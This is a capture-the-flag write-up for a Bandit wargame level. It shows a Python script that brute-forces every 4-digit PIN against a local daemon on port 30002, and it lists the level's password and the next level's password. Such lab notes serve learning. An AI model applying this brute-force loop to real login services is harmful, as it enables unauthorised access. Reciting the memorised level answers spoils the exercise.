## Bandit Level 24 → Level 25

### 🎯 Objective
Connect to the daemon running on port 30002, brute-force the correct 4-digit PIN along with the password of bandit24, and retrieve the password for bandit25.

------------------------------------------------------------

### 🔑 Credentials Provided
Username: bandit24  
Password: gBkkRRC5shuzXlOtURr6YpOFjIzbf3G8

------------------------------------------------------------

### 🔍 Method of Solve
There is a service running on port 30002 which requires:
- bandit24 password  
- a valid 4-digit PIN  

Since the PIN is unknown, a Python script is used to brute-force every PIN (0000–9999).  
Each attempt opens a fresh connection, sends credentials, waits for a response, and stops once “Correct!” is received.

------------------------------------------------------------

### 🧪 Commands / Script Used
~~~python
#!/usr/bin/env python3
import socket
import sys

def brute_force():
    password = "gBkkRRC5shuzXlOtURr6YpOFjIzbf3G8"

    for pincode in range(0, 10000):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect(("127.0.0.1", 30002))
                s.recv(2048)

                message = f"{password} {pincode:04d}\n"
                s.sendall(message.encode())

                response = s.recv(1024).decode()

                if "Wrong" not in response:
                    print(f"\nSuccess! PIN: {pincode:04d}")
                    print("Response:", response)
                    return True

        except socket.timeout:
            continue
        except Exception as e:
            print(e)

    return False

if __name__ == "__main__":
    if brute_force():
        sys.exit(0)
    else:
        print("Failed")
        sys.exit(1)
~~~

------------------------------------------------------------

### 📸 Screenshot
Place screenshot here:
`![Bandit24 Screenshot](screenshots/level24.png)`

------------------------------------------------------------

### 🧠 Explanation
- The script iterates from `0000` → `9999`
- Creates a new socket for every attempt
- Sends: `<bandit24 password> <PIN>`
- Reads server output
- Stops when the server replies with “Correct!”
- Output contains the **bandit25 password**

------------------------------------------------------------

### 🔐 Concept Learned
- Brute-force automation
- Python socket programming
- Timeout handling
- Authentication logic understanding

------------------------------------------------------------

### 🔑 Next Level Password
iCi86ttt4KSNe1armKiwbQNmB3YJP3q4
